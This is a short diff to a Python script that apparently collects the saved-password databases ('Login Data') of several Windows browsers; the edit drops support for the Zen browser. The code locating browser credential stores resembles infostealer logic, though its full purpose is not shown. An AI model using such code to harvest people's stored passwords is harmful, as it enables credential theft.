@@ -246,8 +246,6 @@ def get_login_path(browser):
         return os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")
     elif browser == "Edge":
         return os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Login Data")
-    elif browser == "Zen":
-        return os.path.join(os.getenv("LOCALAPPDATA"), "Zen", "User Data", "Default", "Login Data")
     elif browser == "Opera":
         return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Login Data")
     elif browser == "Opera GX":
@@ -376,7 +374,7 @@ def main():
                 continue
 
     
-    browsers = ["Chrome", "Firefox", "Brave", "Edge", "Zen", "Opera", "Opera GX"]
+    browsers = ["Chrome", "Firefox", "Brave", "Edge", "Opera", "Opera GX"]
     installed_browsers = [browser for browser in browsers if is_browser_installed(browser)]
 
     if not installed_browsers:
